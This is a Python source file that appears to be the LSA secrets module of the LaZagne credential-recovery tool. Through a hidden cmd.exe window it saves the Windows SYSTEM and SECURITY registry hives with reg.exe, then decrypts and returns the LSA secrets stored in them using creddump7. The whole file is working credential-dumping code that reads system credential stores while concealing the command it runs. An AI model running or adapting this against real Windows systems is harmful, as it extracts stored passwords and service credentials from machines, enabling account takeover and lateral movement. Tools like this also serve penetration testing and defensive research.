# -*- coding: utf-8 -*- 
from creddump7.win32.lsasecrets import get_file_secrets
from lazagne.config.write_output import print_debug
from lazagne.config.moduleInfo import ModuleInfo
from lazagne.config.WinStructure import *
from lazagne.config.constant import *
import subprocess
import _subprocess as sub
import tempfile
import random
import string
import os

class LSASecrets(ModuleInfo):
	def __init__(self):
		ModuleInfo.__init__(self, 'lsa_secrets', 'windows', system_module=True)
	
	def save_hives(self):
		for h in constant.hives:
			if not os.path.exists(constant.hives[h]):
				try:
					cmd = 'reg.exe save hklm\%s %s' % (h, constant.hives[h])
					self.run_cmd(cmd)
				except Exception,e:
					print_debug('ERROR', u'Failed to save system hives: {error}'.format(error=e))
					return False
		return True

	def run_cmd(self, cmdline):
		command 			= ['cmd.exe', '/c', cmdline]
		info 				= subprocess.STARTUPINFO()
		info.dwFlags 		= sub.STARTF_USESHOWWINDOW
		info.wShowWindow 	= sub.SW_HIDE
		p 			= subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True)
		results, _ 	= p.communicate()

	def run(self, software_name=None):
		if self.save_hives():
		
			isVistaOrHigher = False
			if float(get_os_version()) >= 6.0:
				isVistaOrHigher = True
			
			# get LSA Secrets
			secrets = get_file_secrets(constant.hives['system'], constant.hives['security'], isVistaOrHigher)
			if secrets:
				pwdFound = ['__LSASecrets__', secrets]
				return pwdFound
